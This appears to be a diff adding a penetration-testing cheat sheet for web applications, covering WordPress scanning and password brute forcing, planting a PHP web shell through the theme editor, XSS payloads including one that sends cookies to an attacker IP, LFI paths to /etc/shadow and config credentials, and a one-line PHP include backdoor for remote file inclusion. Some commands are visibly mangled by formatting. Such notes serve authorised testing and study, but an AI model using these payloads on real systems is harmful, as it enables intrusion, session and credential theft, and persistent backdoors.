@@ -1,0 +1,64 @@
+refer to web app application attacks section for much more
+
+Automatic scanners
+nikto -h <URL>
+python crawleet.py -u <URL> -b -d 3 -e jpg,png,css -f -m -s -x php,txt -y --threads 20
+
+Wordpress
+# Scan
+wpscan --rua -e --url <URL>
+
+# Brute force user(s)
+wpscan --rua --url <URL> -P <PASSWORDS_LIST> -U "<USER>,<USER>"
+
+Wordpress panel RCE
+Modifying a php from the theme used (admin credentials needed)
+Appearance -> Editor -> 404 Template (at the right)
+Change the content for a php shell
+https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
+http://<IP>/wp-content/themes/twentytwelve/404.php
+
+MANUAL HTTP SCANS
+Check the source code
+Technologies used
+$whatweb > $ip:80 --color=never --log-brief="whattheweb.txt"
+curl -s [http:// > $ip/robots.txt](http:// > $ip/robots.txt)
+Burp
+
+    $ get params
+    $ post params
+    $ cookies
+    $ user agents
+    $ referrers
+    $ all the headers
+    $ change get requests to posts
+    $ take note of all error codes
+    $ fuzz parameter values, and names, etc.
+
+Things to be on look for:
+
+    $ Default credentials for software
+    $ SQL-injectable GET/POST params
+    $ XSS
+    Test
+    $ <script> alert("Hello! I am an alert box!!");</script>
+    $ <iframe SRC="http:10.11.0.106/xss_test.html" height = "0" width ="0"></iframe>
+    Exploit
+    $ <script>new Image().src="http://10.11.0.106/bogus.php?output="+document.cookie;</script>
+    $ LFI/RFI through ?page=foo type params
+    LFI:
+    $ /etc/passwd | /etc/shadow insta-win
+    $ /var/www/html/config.php or similar paths to get SQL etc creds
+    $ ?page=php://filter/convert.base64-encode/resource=../config.php
+    $ ../../../../../boot.ini to find out windows version
+    RFI:
+    $ Have your PHP/cgi downloader ready
+    $ <?php include _GET\['inc'\]; ?> simplest backdoor to keep it dynamic without anything messing your output > $ Then you can just http://IP/inc.php?inc=http:// > $YOURIP/bg.php and have full control with minimal footprint on target machine $ get phpinfo()
+
+HTTPS
+
+    $ Heartbleed / CRIME / Other similar attacks
+    $ Read the actual SSL CERT to:
+    $ find out potential correct vhost to GET
+    $ is the clock skewed
+    $ any names that could be usernames for bruteforce/guessing
